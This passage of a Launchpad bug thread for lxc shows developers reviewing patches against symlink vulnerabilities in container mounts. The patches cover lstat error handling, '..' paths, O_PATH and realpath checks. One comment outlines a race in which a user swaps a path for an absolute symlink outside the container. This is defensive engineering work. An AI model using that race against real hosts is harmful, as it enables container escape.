&gt;    - Error checking of lstat(2) is ignored. I think this should be treated as fatal for most (all?) cases.

My tree has

	ret = lstat(path, &amp;sb);
	if (ret)
		return false;

Oh, you mean that if the lstat (or stat) fails, the whole safe_mount()
should be aborted?  That's probably a good thing to fix.

&gt; 3) In open_without_symlink(), why is curlen decremented after assigning
&gt; it the return value of strlen(prefix_skip)? Is it because prefix_skip is
&gt; somehow guaranteed to have a trailing '/' character?

Hm, I don't think that's guaranteed.

&gt; 4) open_without_symlink() is documented to return -1 upon error but it
&gt; returns -EINVAL when target doesn't start with prefix_skip. (minor)
&gt; 
&gt; 5) Is there a need to protect against ".." components in
&gt; open_without_symlink()? I'm thinking of a target of "/foo/../" and a
&gt; prefix_skip of "/foo".

The container admin cannot change the path being passed to
open_without_symlink() without having access to the container config
file, in which case he owns the host (or parent container) end of
story.  But I think it's probably worth simply refusing any paths
with '..' in them, yes.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/30" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-16T21:42:32+00:00" title="2015-09-16 21:42:32 UTC">on 2015-09-16</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/30"> #30</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>On 2015-09-16 21:15:13, Serge Hallyn wrote:<br />
<span class="foldable-quoted">
&gt; Quoting Tyler Hicks (&lt;email address hidden&gt;):<br />
&gt; &gt; 1) In mount_entry(), the call to mount(2) is changed to use target as<br />
&gt; &gt; both the source and the destination. I can&#x27;t see why this would be a<br />
&gt; &gt; valid change.<br />
&gt;<br />
&gt; It appears to me to be more correct.  Since we are doing a remount,<br />
&gt; the old source isn&#x27;t really valid any more.  I&#x27;m thinking of it in<br />
&gt; terms of<br />
&gt;<br />
&gt; 	mount --bind /ab /cd<br />
&gt; 	mount -o bind.remount,ro /cd<br />
&gt;<br />
&gt; But I&#x27;ll test with that part undone, and change it back, as I may just<br />
&gt; not be thinking right.
</span></p>
<p>Aha! It didn&#x27;t click with me that you are doing a remount there. If we<br />
look at the mount(2) man page, under the MS_REMOUNT section:</p>
<p>&quot;target should be the same value specified in the initial mount() call;<br />
source and filesystemtype are ignored.&quot;</p>
<p>I guess you could even pass in NULL for source and filesystemtype.</p>
<p><span class="foldable-quoted">&gt; &gt; 2) In is_file_mount(), the usage of lstat(2) seems odd for a couple reasons:<br />
&gt; &gt;    - If path is a symlink to a directory, the mount will be incorrectly treated as a file mount in safe_mount(). I think stat(2) should be used.<br />
&gt;<br />
&gt; Hm, yeah.  I&#x27;ll change that.<br />
&gt;<br />
&gt; &gt;    - Error checking of lstat(2) is ignored. I think this should be<br />
&gt; treated as fatal for most (all?) cases.<br />
&gt;<br />
&gt; My tree has<br />
&gt;<br />
&gt; 	ret = lstat(path, &amp;sb);<br />
&gt; 	if (ret)<br />
&gt; 		return false;<br />
&gt;<br />
&gt; Oh, you mean that if the lstat (or stat) fails, the whole safe_mount()<br />
&gt; should be aborted?  That&#x27;s probably a good thing to fix.
</span></p>
<p>Yes, that&#x27;s what I meant. At the moment, a return value of false could<br />
mean that it isn&#x27;t a file mount or that lstat(2) failed. Those feel like<br />
two different conditions to me.</p>
<p><span class="foldable-quoted">&gt;<br />
&gt; &gt; 3) In open_without_<wbr />symlink(<wbr />), why is curlen decremented after assigning<br />
&gt; &gt; it the return value of strlen(<wbr />prefix_<wbr />skip)? Is it because prefix_skip is<br />
&gt; &gt; somehow guaranteed to have a trailing &#x27;/&#x27; character?<br />
&gt;<br />
&gt; Hm, I don&#x27;t think that&#x27;s guaranteed.<br />
&gt;<br />
&gt; &gt; 4) open_without_<wbr />symlink(<wbr />) is documented to return -1 upon error but it<br />
&gt; &gt; returns -EINVAL when target doesn&#x27;t start with prefix_skip. (minor)<br />
&gt; &gt;<br />
&gt; &gt; 5) Is there a need to protect against &quot;..&quot; components in<br />
&gt; &gt; open_without_<wbr />symlink(<wbr />)? I&#x27;m thinking of a target of &quot;/foo/../&quot; and a<br />
&gt; &gt; prefix_skip of &quot;/foo&quot;.<br />
&gt;<br />
&gt; The container admin cannot change the path being passed to<br />
&gt; open_without_<wbr />symlink(<wbr />) without having access to the container config<br />
&gt; file, in which case he owns the host (or parent container) end of<br />
&gt; story.  But I think it&#x27;s probably worth simply refusing any paths<br />
&gt; with &#x27;..&#x27; in them, yes.
</span></p>
<p>I understand that the right to modify the container config essentially<br />
equals host root privs so I&#x27;m fine either way and will leave that<br />
decision up to you.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">On 2015-09-16 21:15:13, Serge Hallyn wrote:
&gt; Quoting Tyler Hicks (tyhicks@canonical.com):
&gt; &gt; 1) In mount_entry(), the call to mount(2) is changed to use target as
&gt; &gt; both the source and the destination. I can't see why this would be a
&gt; &gt; valid change.
&gt; 
&gt; It appears to me to be more correct.  Since we are doing a remount,
&gt; the old source isn't really valid any more.  I'm thinking of it in
&gt; terms of
&gt; 
&gt; 	mount --bind /ab /cd
&gt; 	mount -o bind.remount,ro /cd
&gt; 
&gt; But I'll test with that part undone, and change it back, as I may just
&gt; not be thinking right.

Aha! It didn't click with me that you are doing a remount there. If we
look at the mount(2) man page, under the MS_REMOUNT section:

"target should be the same value specified in the initial mount() call;
source and filesystemtype are ignored."

I guess you could even pass in NULL for source and filesystemtype.

&gt; &gt; 2) In is_file_mount(), the usage of lstat(2) seems odd for a couple reasons:
&gt; &gt;    - If path is a symlink to a directory, the mount will be incorrectly treated as a file mount in safe_mount(). I think stat(2) should be used.
&gt; 
&gt; Hm, yeah.  I'll change that.
&gt; 
&gt; &gt;    - Error checking of lstat(2) is ignored. I think this should be
&gt; treated as fatal for most (all?) cases.
&gt; 
&gt; My tree has
&gt; 
&gt; 	ret = lstat(path, &amp;sb);
&gt; 	if (ret)
&gt; 		return false;
&gt; 
&gt; Oh, you mean that if the lstat (or stat) fails, the whole safe_mount()
&gt; should be aborted?  That's probably a good thing to fix.

Yes, that's what I meant. At the moment, a return value of false could
mean that it isn't a file mount or that lstat(2) failed. Those feel like
two different conditions to me.

&gt; 
&gt; &gt; 3) In open_without_symlink(), why is curlen decremented after assigning
&gt; &gt; it the return value of strlen(prefix_skip)? Is it because prefix_skip is
&gt; &gt; somehow guaranteed to have a trailing '/' character?
&gt; 
&gt; Hm, I don't think that's guaranteed.
&gt; 
&gt; &gt; 4) open_without_symlink() is documented to return -1 upon error but it
&gt; &gt; returns -EINVAL when target doesn't start with prefix_skip. (minor)
&gt; &gt; 
&gt; &gt; 5) Is there a need to protect against ".." components in
&gt; &gt; open_without_symlink()? I'm thinking of a target of "/foo/../" and a
&gt; &gt; prefix_skip of "/foo".
&gt; 
&gt; The container admin cannot change the path being passed to
&gt; open_without_symlink() without having access to the container config
&gt; file, in which case he owns the host (or parent container) end of
&gt; story.  But I think it's probably worth simply refusing any paths
&gt; with '..' in them, yes.

I understand that the right to modify the container config essentially
equals host root privs so I'm fine either way and will leave that
decision up to you.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/31" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-17T04:20:15.476086+00:00" title="2015-09-17 04:20:15 UTC">on 2015-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/31"> #31</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4466529/+files/0001-Protect-container-mounts-against-symlinks.patch">NEW patch against upstream git HEAD</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4466529">Edit</a>
        (21.6 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/32" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-17T04:54:36.684326+00:00" title="2015-09-17 04:54:36 UTC">on 2015-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/32"> #32</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The patch above still causes some regressions.  The fix may be simple, but it&#x27;s getting late.</p>
<p>The issue, I hope, is that we demand that we be able to inspect the mount target, to detect whether it is a symlink.  This is more restrictive than &#x27;mount&#x27; is.  I can, from a non-init userns, mount a directory over /root even though i can&#x27;t look at /root.</p>
<p>One of the failures I&#x27;m seeing is with $containerroot/<wbr />proc/sysrq-<wbr />trigger, which is<br />
--w------- 1 root root 0 Sep 16 23:47 /proc/sysrq-trigger</p>
<p>Since a symbolic cannot have its permissions changed, I think we can assume that if we get EPERM on a final part of a link, we can allow the mount.</p>
<p>However, since we cannot then open the file/dir (to fchdir to or to mount onto /proc/self/fd), dealing with this complicates the whole thing.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The patch above still causes some regressions.  The fix may be simple, but it's getting late.

The issue, I hope, is that we demand that we be able to inspect the mount target, to detect whether it is a symlink.  This is more restrictive than 'mount' is.  I can, from a non-init userns, mount a directory over /root even though i can't look at /root.

One of the failures I'm seeing is with $containerroot/proc/sysrq-trigger, which is
--w------- 1 root root 0 Sep 16 23:47 /proc/sysrq-trigger

Since a symbolic cannot have its permissions changed, I think we can assume that if we get EPERM on a final part of a link, we can allow the mount.

However, since we cannot then open the file/dir (to fchdir to or to mount onto /proc/self/fd), dealing with this complicates the whole thing.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/33" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-17T14:19:27.649295+00:00" title="2015-09-17 14:19:27 UTC">on 2015-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/33"> #33</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>We can detect the case where the last path element is unreadable, but<br />
we can&#x27;t then handle it using this technique.  If we just detect that<br />
case and then fall back to mount(src, dest, ...), then we are open to a<br />
race where</p>
<p>&nbsp;&nbsp;a. first /home/$user was bind-mounted into the container at /foo<br />
&nbsp;&nbsp;b. then a mount is directed onto $containerroot/<wbr />foo/a/b/<wbr />c<br />
&nbsp;&nbsp;c. /home/$user/c is unreadable<br />
&nbsp;&nbsp;d. $user can redirect /home/$user/a/b to become an absolute symlink<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outside of the container (let&#x27;s say /) after we&#x27;ve checked for<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;absolute symlinks on /a/b but before we do the simple mount()</p>
<p>We&#x27;d need a way to use an fd to /a/b to prevent that from happening.<br />
Perhaps we can chdir(/a/b) and then mount onto relative path &#x27;c&#x27; ?<br />
However c itself is still racy.</p>
<p>And so I&#x27;m leaning back toward doing the approach where we just blindly<br />
do the mount, then check /proc/self/<wbr />mountinfo or realpath() output to<br />
verify that the mount was placed inside the container.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">We can detect the case where the last path element is unreadable, but
we can't then handle it using this technique.  If we just detect that
case and then fall back to mount(src, dest, ...), then we are open to a
race where

  a. first /home/$user was bind-mounted into the container at /foo
  b. then a mount is directed onto $containerroot/foo/a/b/c
  c. /home/$user/c is unreadable
  d. $user can redirect /home/$user/a/b to become an absolute symlink
     outside of the container (let's say /) after we've checked for
     absolute symlinks on /a/b but before we do the simple mount()

We'd need a way to use an fd to /a/b to prevent that from happening.
Perhaps we can chdir(/a/b) and then mount onto relative path 'c' ?
However c itself is still racy.

And so I'm leaning back toward doing the approach where we just blindly
do the mount, then check /proc/self/mountinfo or realpath() output to
verify that the mount was placed inside the container.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/34" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-17T14:55:08+00:00" title="2015-09-17 14:55:08 UTC">on 2015-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/lxc/+bug/1476662/comments/34">
                <strong>AW: [Bug 1476662] Re: lxc-start symlink vulnerabilities may allow guest to read host filesystem, interfere with apparmor</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/34"> #34</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I think that the implementation of fusermount (file system in user space) had<br />
similar problem, some code in this domain uses scheme, were process opens the<br />
dir, chdirs in the other one and uses the /proc/self/fd elements in the mount<br />
command.</p>
<p>This is even resistent to moving/deleting and recreating the directory in<br />
between, but I&#x27;m not sure, if it could be applied here also.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I think that the implementation of fusermount (file system in user space) had 
similar problem, some code in this domain uses scheme, were process opens the 
dir, chdirs in the other one and uses the /proc/self/fd elements in the mount 
command.

This is even resistent to moving/deleting and recreating the directory in 
between, but I'm not sure, if it could be applied here also.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/35" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-17T16:04:38.092791+00:00" title="2015-09-17 16:04:38 UTC">on 2015-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/35"> #35</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@roma-fiedler,</p>
<p>I think what you describe is what my last patch was doing.  The problem is we need to be able to mount files onto paths which we can&#x27; topen (i.e. /proc/sysrq-<wbr />trigger)<wbr />.  In that case I can&#x27;t see a way to make sure that the path is not changed between our last check of it and the mount onto it.</p>
<p>Failing any good solution to that, I intend to switch out all that code in favor of code which just does the mount, then checks realpth() results to make sure the target ended up in the container directory.  Since we are in a MS_SLAVE remounted rootfs in a private mntns, there shouldn&#x27;t be any downsides to that approach.  Feedback very much appreciated.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@roma-fiedler,

I think what you describe is what my last patch was doing.  The problem is we need to be able to mount files onto paths which we can' topen (i.e. /proc/sysrq-trigger).  In that case I can't see a way to make sure that the path is not changed between our last check of it and the mount onto it.

Failing any good solution to that, I intend to switch out all that code in favor of code which just does the mount, then checks realpth() results to make sure the target ended up in the container directory.  Since we are in a MS_SLAVE remounted rootfs in a private mntns, there shouldn't be any downsides to that approach.  Feedback very much appreciated.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/36" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-17T16:48:11.772762+00:00" title="2015-09-17 16:48:11 UTC">on 2015-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/36"> #36</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Eric suggested using O_PATH in that case, I&#x27;ll try that.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Eric suggested using O_PATH in that case, I'll try that.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/41" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-17T22:07:57.444370+00:00" title="2015-09-17 22:07:57 UTC">on 2015-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/41"> #41</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>A few minor comments on v2.</p>
<p>1) Typo in the commit message: &quot;The host&#x27;s mount path may container ...&quot;</p>
<p>2) The function documentation for is_subdir() needs updating to reflect the new params.</p>
<p>3) The fstatat() in the while loop of open_without_<wbr />symlink(<wbr />) is not needed. open_if_safe() passes the O_NOFOLLOW flag to openat(2) so symlinks are already being properly detected.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">A few minor comments on v2.

1) Typo in the commit message: "The host's mount path may container ..."

2) The function documentation for is_subdir() needs updating to reflect the new params.

3) The fstatat() in the while loop of open_without_symlink() is not needed. open_if_safe() passes the O_NOFOLLOW flag to openat(2) so symlinks are already being properly detected.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/42" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-17T22:25:43.108013+00:00" title="2015-09-17 22:25:43 UTC">on 2015-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/42"> #42</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks - updated to address those, and also removed the &#x27;..&#x27; check as discussed since we verify that the target doesn&#x27;t escape the container rootfs.  Uploading new tarball.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks - updated to address those, and also removed the '..' check as discussed since we verify that the target doesn't escape the container rootfs.  Uploading new tarball.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/43" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-17T22:26:07.172451+00:00" title="2015-09-17 22:26:07 UTC">on 2015-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/43"> #43</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

